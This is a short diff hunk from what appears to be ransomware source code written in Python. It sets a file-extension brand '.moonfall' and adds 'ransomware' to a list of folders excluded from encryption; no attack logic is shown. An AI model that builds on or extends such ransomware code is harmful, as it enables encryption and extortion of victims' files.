@@ -18,7 +18,7 @@ import ctypes
 
 
 brand_name = '.moonfall'
-protected_folders = ['PerfLogs', 'Windows']
+protected_folders = ['PerfLogs', 'Windows', 'ransomware']
 
 
 """
